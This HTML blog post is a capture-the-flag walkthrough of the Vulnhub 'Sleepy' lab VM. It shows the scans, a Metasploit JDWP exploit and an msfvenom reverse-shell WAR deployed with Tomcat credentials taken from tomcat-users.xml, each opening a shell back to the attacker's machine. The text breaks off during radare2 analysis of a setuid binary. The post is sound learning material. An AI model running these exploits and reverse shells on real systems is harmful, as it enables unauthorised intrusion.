
<!DOCTYPE HTML>
<html>
<head>
	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
	<meta charset="utf-8">
	<title>[Vulnhub] Sleepy  | F4l13n5n0w</title>

<meta name="author" content="F4l13n5n0w"> 

<meta name="description" content="This is a description"> <meta name="keywords" content="">

	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="F4l13n5n0w" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>

<script language="Javascript" type="text/javascript">
$(document).ready(
  function() {
    (function($) {
      $(".fancybox[data-content-id]").each(function() {
        this.href = $(this).data('content-id');
      });
      $(".fancybox").fancybox({
        beforeLoad: function() {
          var el, 
              id = $(this.element).data('title-id');

          if (id) {
            el = $('#' + id);

            if (el.length) {
              this.title = el.html();
            }
          }
          if ($(this).data('content')) {
            this.content = $(this).data('content');
          }
        },
        helpers: {
          title: {
            type: 'inside'
          }
        }
      });
    })(jQuery);
  }
);
</script>

	<link href='https://fonts.googleapis.com/css?family=Delius' rel='stylesheet' type='text/css'>
</head>



<body>
	<header id="header" class="inner"><h1><a href="/">F4l13n5n0w</a></h1>
<h4>Info Security & Pen Testing learning notes</h4>
<nav id="main-nav"><ul>
	<li><a href="/about">瓷 | About</a></li>
	<li><a href="/">段子 | Blogging</a></li>
	<li><a href="/code-snippets">玩意儿 | Coding</a></li>
	<li><a href="/reading-list">藏♥品 | Reading</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul>
	<li><a href="/about">瓷 | About</a></li>
	<li><a href="/">段子 | Blogging</a></li>
	<li><a href="/code-snippets">玩意儿 | Coding</a></li>
	<li><a href="/reading-list">藏♥品 | Reading</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:f4l13n5n0w.github.io">
			</form>
		</div>
	</div>
</nav>


</header>

	<div id="content" class="inner"><article class="post">
	<h2 class="title">[Vulnhub] Sleepy</h2>
	<div class="entry-content"><p><strong>/dev/random: Sleepy</strong> is the latest one in the series <strong>/dev/random</strong>, which is created by <a href="https://www.vulnhub.com/author/sagi-,36/">Sagi-</a>.</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/devrandom-sleepy,123/">here</a>.</p>

<!-- more -->


<p><img class="left" src="/downloads/sleepy/sleepy.png"></p>

<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: /dev/random: Sleepy (<em>10.1.1.142/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Analysed and found vulnerable application / service (JDWP running on port 9001) and the vulnerability is <a href="https://www.rapid7.com/db/modules/exploit/multi/misc/java_jdwp_debugger" title="JDWP Remote Code Execution"><strong>Java Debug Wire Protocol Remote Code Execution</strong></a></li>
<li>Exploit JDWP vulnerability and get shell with limited &lsquo;sleepy&rsquo; privilege</li>
<li>Searching and find Tomcat&rsquo;s admin login credential which stored in the default file: <font color="green"><em>/etc/tomcat/tomcat-users.xml</em></font></li>
<li>Set up Kali and log in to Tomcat manager page with admin priviledge, then generate, upload and deploy the evil WAR file to target server</li>
<li>Set up MSF and then get a reverse shell back by accessing the evil page I deployed previously, now we get a new shell with the priviledge of &lsquo;tomcat&rsquo;</li>
<li>Enumerating and find vulnerable binary &lsquo;/usr/bin/nightmare&rsquo; which has sticky bit set and belong to ROOT group.</li>
<li>Analysed and exploit &lsquo;/usr/bin/nightmare&rsquo; to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Search and found JDWP remote code vulnerability which can be exploited to get shell</li>
<li>Enumerate and found tomcat&rsquo;s login configuration file in the default location (/etc/tomcat/tomcat-users.xml)</li>
<li>Set up Kali2 and log in to Tomcat&rsquo;s manager page with the credential found previously</li>
<li>Generate evil WAR file by using <strong>msfvenom</strong>, then upload and deploy on Tomcat server</li>
<li>Set up MSF console and trigging the reverse shell by accessing the evil page deployed before [<font color="FF8000">Metasploit</font>]</li>
<li>With the priveilege of tomcat, enumerate and find vulnerable binary <code>/usr/bin/nightmare</code> which has sticky bit set and in ROOT group</li>
<li>Download <code>/usr/bin/nightmare</code> to local, analyse with <code>radare2</code> and exploit it to get ROOT [<font color="FF8000">radare2</font>]</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://www.metasploit.com/">Metasploit</a></li>
<li><a href="https://github.com/radare/radare2">radare2</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address (10.1.1.142 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.142    00:0c:29:0b:18:9f   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:ed:31:70   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">6</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.529 seconds <span class="o">(</span>101.23 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure>


<p>10.1.1.142 is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.142/32 --rate<span class="o">=</span>10000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2015-11-06 09:49:16 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 8009/tcp on 10.1.1.142
</span><span class='line'>Discovered open port 21/tcp on 10.1.1.142
</span><span class='line'>Discovered open port 9001/tcp on 10.1.1.142
</span></code></pre></td></tr></table></div></figure>


<p>Now there are 3 ports (21, 8009, 9001) detected by <code>masscan</code>, then I run <code>nmap</code> to do a deeper service scan.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Nmap 6.49BETA4 scan initiated Fri Nov  6 04:51:36 2015 as: nmap -sV -v -A -T4 -O -p 8009,21,9001 -oN 10.1.1.142_nmap.txt 10.1.1.142</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.142
</span><span class='line'>Host is up <span class="o">(</span>0.00063s latency<span class="o">)</span>.
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>21/tcp   open  ftp     vsftpd 2.0.8 or later
</span><span class='line'><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_Can<span class="err">&#39;</span>t get directory listing: TIMEOUT
</span><span class='line'>8009/tcp open  ajp13   Apache Jserv <span class="o">(</span>Protocol v1.3<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_ajp-methods: Failed to get a valid response <span class="k">for</span> the OPTION request
</span><span class='line'>9001/tcp open  jdwp    Java Debug Wire Protocol <span class="o">(</span>Reference Implementation<span class="o">)</span> version 1.6 1.7.0_71
</span><span class='line'>MAC Address: 00:0C:29:0B:18:9F <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 2.6.X<span class="p">|</span>3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
</span><span class='line'>Uptime guess: 0.002 days <span class="o">(</span>since Fri Nov  <span class="m">6</span> 04:49:25 2015<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>... turncate ...
</span></code></pre></td></tr></table></div></figure>


<p>I checked the FTP first and from the <code>nmap</code> scanning result, Anonymous login allowed. However, there is only one PNG file (sleepy.png) in <code>pub</code> folder and there is no permission to upload file through anonymous account. Nothing can be found in the PNG file, so I move on.</p>

<p>Next is port 8009, ajp13 Apache JServ. This <a href="http://insight-labs.org/?p=1095" title="Exploit on Tomcat with AJP">blog</a> described a method to exploit Tomcat with AJP protocol. The good news is that I can touch the login page of Tomcat manager. However, after several failed trials, I still could not manage the login credential. Have to leave it for now and move on :(</p>

<p>The third open port is 9001 which Java Debug Wire Protocol is running on it. By searching online for any exist exploit, I found this <a href="https://www.rapid7.com/db/modules/exploit/multi/misc/java_jdwp_debugger" title="JDWP Remote Code Execution">JDWP Remote Code Execution</a>.</p>

<p>Then I startup Metasploit console and get a reverse shell with this JDWP exploit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf &gt; search jdwp
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Module database cache not built yet, using slow search
</span><span class='line'>
</span><span class='line'>Matching <span class="nv">Modules</span>
</span><span class='line'><span class="o">================</span>
</span><span class='line'>
</span><span class='line'>   Name                                   Disclosure Date  Rank  Description
</span><span class='line'>   ----                                   ---------------  ----  -----------
</span><span class='line'>   exploit/multi/misc/java_jdwp_debugger  2010-03-12       good  Java Debug Wire Protocol Remote Code Execution
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf &gt; use exploit/multi/misc/java_jdwp_debugger
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; <span class="nb">set </span>RHOST 10.1.1.142
</span><span class='line'><span class="nv">RHOST</span> <span class="o">=</span>&gt; 10.1.1.142
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; <span class="nb">set </span>RPORT 9001
</span><span class='line'><span class="nv">RPORT</span> <span class="o">=</span>&gt; 9001
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; <span class="nb">set </span>payload linux/x86/meterpreter/reverse_tcp
</span><span class='line'><span class="nv">payload</span> <span class="o">=</span>&gt; linux/x86/meterpreter/reverse_tcp
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; <span class="nb">set </span>LHOST 10.1.1.130
</span><span class='line'><span class="nv">LHOST</span> <span class="o">=</span>&gt; 10.1.1.130
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; check
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - The target appears to be vulnerable.
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; exploit
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse handler on 10.1.1.130:4444
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Retrieving the sizes of variable sized data types in the target VM...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Getting the version of the target VM...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Getting all currently loaded classes by the target VM...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Getting all running threads in the target VM...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Setting <span class="s1">&#39;step into&#39;</span> event...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Resuming VM and waiting <span class="k">for</span> an event...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Received <span class="m">1</span> responses that are not a <span class="s1">&#39;step into&#39;</span> event...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Deleting step event...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Disabling security manager <span class="k">if</span> set...
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> 10.1.1.142:9001 - Security manager was not <span class="nb">set</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - Dropping and executing payload...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Transmitting intermediate stager <span class="k">for</span> over-sized stage...<span class="o">(</span><span class="m">105</span> bytes<span class="o">)</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">1495598</span> bytes<span class="o">)</span> to 10.1.1.142
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.1.1.130:4444 -&gt; 10.1.1.142:35957<span class="o">)</span> at 2015-11-06 08:08:24 -0500
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Deleted /tmp/zNfkVK
</span><span class='line'>
</span><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer     : sleepy
</span><span class='line'>OS           : Linux sleepy 3.10.0-123.13.2.el7.x86_64 <span class="c">#1 SMP Thu Dec 18 14:09:13 UTC 2014 (x86_64)</span>
</span><span class='line'>Architecture : x86_64
</span><span class='line'>Meterpreter  : x86/linux
</span><span class='line'>meterpreter &gt; shell
</span><span class='line'>Process <span class="m">2878</span> created.
</span><span class='line'>Channel <span class="m">1</span> created.
</span><span class='line'>sh: no job control in this shell
</span><span class='line'>sh-4.2<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>sleepy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>sleepy<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>sleepy<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:initrc_t:s0
</span><span class='line'>sh-4.2<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span></code></pre></td></tr></table></div></figure>


<p>Cool~ Now I get in as user <code>sleepy</code>!</p>

<p>Next thing is to find login credential of Tomcat manager page.</p>

<p>After poking around in the file system, I found the default Tomcat users file <code>/etc/tomcat/tomcat-users.xml</code>:</p>

<p>File /etc/tomcat/tomcat-users.xml could not be found</p>

<p>At the bottom of the xml file, I found the tomcat login credential in plaintext: <code>sl33py / Gu3SSmYStR0NgPa$sw0rD!</code>!</p>

<p>Now, we are on the right track and the next thing is getting clear:</p>

<p>Run <code>msfvenom</code> as follow to generate evil WAR file with reverse shell payload.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">## create evil WAR file with reverse shell payload</span>
</span><span class='line'>root@kali:~# msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.1.1.130 <span class="nv">LPORT</span><span class="o">=</span><span class="m">8888</span> -f war &gt; sleepy.war
</span><span class='line'>
</span><span class='line'><span class="c">## check the WAR file and note the evil page: atodruyscupc.jsp </span>
</span><span class='line'>root@kali:~# jar -xvf sleepy.war
</span><span class='line'> inflated: META-INF/MANIFEST.MF
</span><span class='line'>  created: WEB-INF/
</span><span class='line'> inflated: WEB-INF/web.xml
</span><span class='line'> inflated: atodruyscupc.jsp
</span><span class='line'> inflated: VFTwyDWxQug.txt
</span></code></pre></td></tr></table></div></figure>


<p>After upload and deployed the WAR file on target Tomcat server, I set up Metasploit console and access the target page <code>http://10.1.1.130/sleepy/atodruyscupc.jsp</code> to get a shell back as user <code>tomcat</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; show options
</span><span class='line'>
</span><span class='line'>Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options <span class="o">(</span>linux/x86/meterpreter/reverse_tcp<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name          Current Setting  Required  Description
</span><span class='line'>   ----          ---------------  --------  -----------
</span><span class='line'>   DebugOptions  <span class="m">0</span>                no        Debugging options <span class="k">for</span> POSIX meterpreter
</span><span class='line'>   LHOST         10.1.1.130       yes       The listen address
</span><span class='line'>   LPORT         <span class="m">8888</span>             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   <span class="m">0</span>   Wildcard Target
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>ExitOnSession <span class="nb">false </span>
</span><span class='line'><span class="nb"> </span><span class="nv">ExitOnSession</span> <span class="o">=</span>&gt; <span class="nb">false</span>
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; exploit -j -z
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exploit running as background job.
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse handler on 10.1.1.130:8888
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.1.1.130:8888 -&gt; 10.1.1.142:38614<span class="o">)</span> at 2015-11-06 22:07:09 -0500
</span><span class='line'>
</span><span class='line'>python -c <span class="s2">&quot;import pty; pty.spawn(&#39;/bin/bash&#39;);&quot;</span>
</span><span class='line'>bash-4.2<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:tomcat_t:s0
</span><span class='line'>bash-4.2<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/usr/share/tomcat
</span><span class='line'>bash-4.2<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Now we have escaped priviledge to <code>tomcat</code> successfully!</p>

<p>After enmueration (<a href="https://blog.g0tmi1k.com/">g0tmi1k</a> has made a really helpful guide for enumerating and you can find it <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" title="Basic Linux Privilege Escalation">here</a>), I found one suspected binary file <code>/usr/bin/nightmare</code> which has sticky bit set and belong to ROOT group.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.2<span class="nv">$ </span>find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
</span><span class='line'>find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
</span><span class='line'>/usr/bin/mount
</span><span class='line'>/usr/bin/chage
</span><span class='line'>/usr/bin/gpasswd
</span><span class='line'>/usr/bin/newgrp
</span><span class='line'>/usr/bin/chfn
</span><span class='line'>/usr/bin/su
</span><span class='line'>/usr/bin/chsh
</span><span class='line'>/usr/bin/umount
</span><span class='line'>/usr/bin/sudo
</span><span class='line'>/usr/bin/pkexec
</span><span class='line'>/usr/bin/crontab
</span><span class='line'>/usr/bin/nightmare
</span><span class='line'>/usr/bin/passwd
</span><span class='line'>/usr/sbin/pam_timestamp_check
</span><span class='line'>/usr/sbin/unix_chkpwd
</span><span class='line'>/usr/sbin/usernetctl
</span><span class='line'>/usr/lib/polkit-1/polkit-agent-helper-1
</span><span class='line'>/usr/lib64/dbus-1/dbus-daemon-launch-helper
</span><span class='line'>bash-4.2<span class="nv">$ </span>ls -alh /usr/bin/nightmare
</span><span class='line'>ls -alh /usr/bin/nightmare
</span><span class='line'>-rwsr-s---. <span class="m">1</span> root tomcat 8.5K Jan <span class="m">18</span>  <span class="m">2015</span> /usr/bin/nightmare
</span></code></pre></td></tr></table></div></figure>


<p>Download the binary &ldquo;/usr/bin/nightmare&rdquo; to my local Kali Linux and using disassembler <code>Radare 2</code> to analyze the binary.</p>

<p>Disassemble all functions and print the code of function &lsquo;main&rsquo;:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nl">root@kali:</span><span class="err">~/</span><span class="nf">myNotes</span><span class="err">/</span><span class="no">Vulnhub_notes</span><span class="err">/</span><span class="no">the</span> <span class="no">sleepy</span><span class="c"># r2 nightmare </span>
</span><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">aa</span>
</span><span class='line'><span class="err">[0</span><span class="nf">x004006b0</span><span class="err">]&gt;</span> <span class="no">pdf</span> <span class="err">@</span> <span class="no">main</span>
</span><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">sym.main</span> <span class="mi">250</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040083e</span>    <span class="mi">55</span>           <span class="no">push</span> <span class="no">rbp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040083f</span>    <span class="mi">4889</span><span class="no">e5</span>       <span class="no">mov</span> <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400842</span>    <span class="mi">4881</span><span class="no">eca0000.</span> <span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0xa0</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400849</span>    <span class="mi">488</span><span class="no">d8560fff.</span> <span class="no">lea</span> <span class="no">rax</span><span class="p">,</span> <span class="err">[</span><span class="no">rbp-0xa0</span><span class="err">]</span>
